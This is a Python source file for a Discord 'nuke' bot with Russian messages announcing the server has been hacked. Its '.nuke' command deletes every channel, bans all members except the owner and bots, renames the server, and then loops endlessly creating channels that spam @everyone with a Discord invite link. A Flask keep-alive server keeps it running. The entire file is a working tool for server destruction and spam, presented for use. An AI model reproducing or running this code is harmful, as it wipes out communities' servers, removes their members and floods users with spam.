import discord
from discord.ext import commands
import asyncio
from threading import Thread
from flask import Flask

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"Бот {bot.user} готов к уничтожению")

@bot.command()
async def ping(ctx):
    await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    
    invites = await guild.invites()
    for invite in invites:
        if invite.code == "W9fRBPUGbV":
            await ctx.send("пошёл нахуй")
            return
    
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    ban_tasks = [member.ban(reason="NUKE") for member in guild.members if member != guild.owner and not member.bot]
    await asyncio.gather(*ban_tasks, return_exceptions=True)
    
    await guild.edit(name="ВЫ БЫЛИ ВЗЛОМАНЫ")
    
    i = 0
    while True:
        tasks = []
        for _ in range(10):
            async def create_ch(idx):
                ch = await guild.create_text_channel(f"crash-{idx}")
                await ch.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
            tasks.append(create_ch(i))
            i += 1
        await asyncio.gather(*tasks, return_exceptions=True)

import os

keep_alive()
bot.run(os.getenv("TOKEN"))
